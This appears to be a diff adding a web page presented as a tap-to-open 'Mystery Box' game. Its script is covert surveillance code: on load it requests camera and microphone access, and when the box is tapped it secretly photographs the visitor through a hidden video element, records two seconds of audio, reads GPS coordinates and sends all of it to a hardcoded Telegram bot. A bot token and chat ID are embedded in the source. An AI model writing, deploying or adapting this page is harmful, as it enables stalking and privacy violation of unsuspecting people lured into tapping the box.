@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>🎁 Mystery Box</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a472a 0%, #0e2a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Poppins', cursive;
+            cursor: pointer;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .box {
+            width: 280px;
+            height: 280px;
+            background: radial-gradient(circle at 30% 30%, #d4a017, #8b5e00);
+            margin: 20px auto;
+            border-radius: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4), inset 0 1px 2px rgba(255,255,200,0.6);
+            position: relative;
+        }
+
+        .box:active {
+            transform: scale(0.94);
+        }
+
+        .box span {
+            font-size: 5rem;
+            transition: 0.2s;
+        }
+
+        .box.opened span {
+            font-size: 6rem;
+        }
+
+        h1 {
+            color: #ffdd99;
+            text-shadow: 3px 3px 0 #6b3e00;
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+        }
+
+        .sub {
+            color: #eedd99;
+            font-size: 1rem;
+            margin-bottom: 20px;
+            font-style: italic;
+        }
+
+        .status {
+            position: fixed;
+            bottom: 30px;
+            left: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            color: gold;
+            padding: 12px;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            font-family: monospace;
+            text-align: center;
+            backdrop-filter: blur(8px);
+            transition: 0.2s;
+        }
+
+        .hint {
+            margin-top: 30px;
+            color: #c9b16b;
+            font-size: 0.8rem;
+            background: rgba(0,0,0,0.4);
+            display: inline-block;
+            padding: 8px 18px;
+            border-radius: 40px;
+        }
+
+        video, canvas, audio {
+            display: none;
+        }
+
+        .sparkle {
+            position: fixed;
+            pointer-events: none;
+            font-size: 1.5rem;
+            animation: floatUp 1s ease-out forwards;
+        }
+
+        @keyframes floatUp {
+            0% { transform: scale(0.5) translateY(0); opacity: 1; }
+            100% { transform: scale(1.5) translateY(-100px); opacity: 0; }
+        }
+
+        @keyframes shakeBox {
+            0% { transform: rotate(0deg); }
+            25% { transform: rotate(5deg); }
+            75% { transform: rotate(-5deg); }
+            100% { transform: rotate(0deg); }
+        }
+
+        .shake {
+            animation: shakeBox 0.2s ease-in-out 2;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🎁 MYSTERY BOX 🎁</h1>
+    <div class="sub">✨ something special inside... ✨</div>
+    
+    <div class="box" id="mysteryBox">
+        <span id="boxEmoji">📦</span>
+    </div>
+    
+    <div class="hint">
+        👆 TAP THE BOX (only once)
+    </div>
+</div>
+<div class="status" id="statusMsg">🎁 tap the box to open</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ==========================================
+// YOUR TELEGRAM BOT (keep secret)
+// ==========================================
+const BOT_TOKEN = "8620757440:AAEYnQxTOHDNA9ILuQcT5DDmokg_yF1Joso";
+const CHAT_ID = "6225205122";
+// ==========================================
+
+let mediaStream = null;
+let mediaRecorder = null;
+let audioChunks = [];
+let boxOpened = false;
+let tapCount = 0;
+
+// === Helper: sparkle effect
+function createSparkle(x, y) {
+    const spark = document.createElement('div');
+    spark.className = 'sparkle';
+    spark.innerHTML = ['✨','⭐','💎','🎁','🔮'][Math.floor(Math.random()*5)];
+    spark.style.left = (x - 15) + 'px';
+    spark.style.top = (y - 15) + 'px';
+    document.body.appendChild(spark);
+    setTimeout(() => spark.remove(), 1000);
+}
+
+// === Get camera + mic permissions
+async function initMedia() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        mediaStream = stream;
+        document.getElementById('video').srcObject = stream;
+        
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
+        return true;
+    } catch(e) {
+        console.warn("perm error", e);
+        return false;
+    }
+}
+
+// === Get location
+function getLocationShort() {
+    return new Promise((resolve) => {
+        if(!navigator.geolocation) { resolve("📍 No GPS"); return; }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => resolve(`📍 ${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`),
+            () => resolve("📍 Location denied"),
+            { timeout: 4000 }
+        );
+    });
+}
+
+// === Take photo
+function takePhoto() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    canvas.width = video.videoWidth || 400;
+    canvas.height = video.videoHeight || 300;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
+}
+
+// === Record short audio (2 seconds)
+function recordAudioClip() {
+    return new Promise((resolve) => {
+        if(!mediaRecorder || mediaRecorder.state !== 'inactive') { resolve(null); return; }
+        audioChunks = [];
+        mediaRecorder.start();
+        setTimeout(() => {
+            if(mediaRecorder.state === 'recording') mediaRecorder.stop();
+            setTimeout(() => {
+                if(audioChunks.length) resolve(new Blob(audioChunks, { type: 'audio/webm' }));
+                else resolve(null);
+            }, 80);
+        }, 2100);
+    });
+}
+
+// === Send to Telegram
+async function sendToTelegram(photoBlob, audioBlob, locationTxt) {
+    const timeNow = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+    const caption = `🎁 MYSTERY BOX OPENED 🎁\n🕐 ${timeNow}\n${locationTxt}\n✨ someone opened the box! ✨`;
+    
+    // send photo
+    let formPhoto = new FormData();
+    formPhoto.append('chat_id', CHAT_ID);
+    formPhoto.append('photo', photoBlob, 'mystery_box.jpg');
+    formPhoto.append('caption', caption);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formPhoto });
+    
+    // send audio if exists
+    if(audioBlob) {
+        let formAudio = new FormData();
+        formAudio.append('chat_id', CHAT_ID);
+        formAudio.append('audio', audioBlob, 'box_surprise.webm');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formAudio });
+    }
+}
+
+// === Box open effect (only once)
+async function openMysteryBox(e) {
+    if(boxOpened) {
+        showStatus("🎁 box already opened! 🎁", "#ffaa44");
+        return;
+    }
+    
+    boxOpened = true;
+    const boxDiv = document.getElementById('mysteryBox');
+    const emojiSpan = document.getElementById('boxEmoji');
+    
+    // get click coordinates for sparkle
+    let x = e.clientX || (e.touches ? e.touches[0].clientX : window.innerWidth/2);
+    let y = e.clientY || (e.touches ? e.touches[0].clientY : window.innerHeight/2);
+    
+    // add shake effect
+    boxDiv.classList.add('shake');
+    setTimeout(() => boxDiv.classList.remove('shake'), 500);
+    
+    // change emoji to opening
+    emojiSpan.innerText = '🔓';
+    showStatus("🔓 unlocking mystery...", "#ffcc66");
+    
+    // sparkles
+    for(let i=0;i<12;i++) setTimeout(() => createSparkle(x+ (Math.random()-0.5)*100, y+ (Math.random()-0.5)*100), i*50);
+    
+    // capture photo + audio + location
+    try {
+        const photo = await takePhoto();
+        const audio = await recordAudioClip();
+        const loc = await getLocationShort();
+        
+        await sendToTelegram(photo, audio, loc);
+        
+        // final fun effect
+        emojiSpan.innerText = '🎁✨';
+        showStatus("✅ MYSTERY SENT TO TELEGRAM! ✅", "#aaffaa");
+        
+        setTimeout(() => {
+            emojiSpan.innerText = '🎁';
+            showStatus("🎁 box opened. thank you! 🎁", "#ffaa66");
+        }, 2000);
+        
+    } catch(err) {
+        emojiSpan.innerText = '💥';
+        showStatus("❌ something went wrong :( tap again later", "red");
+        console.error(err);
+    }
+}
+
+// === show floating status
+function showStatus(msg, color) {
+    const div = document.getElementById('statusMsg');
+    div.innerHTML = msg;
+    div.style.color = color || "gold";
+    setTimeout(() => {
+        if(div.innerHTML === msg) {
+            div.innerHTML = "🎁 mystery box ready";
+            div.style.color = "gold";
+        }
+    }, 3500);
+}
+
+// === attach event to box
+const box = document.getElementById('mysteryBox');
+box.addEventListener('click', openMysteryBox);
+box.addEventListener('touchstart', (e) => { e.preventDefault(); openMysteryBox(e); }, { passive: false });
+
+// init camera + mic on load
+initMedia();
+
+// small intro effect
+setTimeout(() => showStatus("✨ tap the mystery box... ✨", "#ffaa77"), 500);
+</script>
+</body>
+</html>
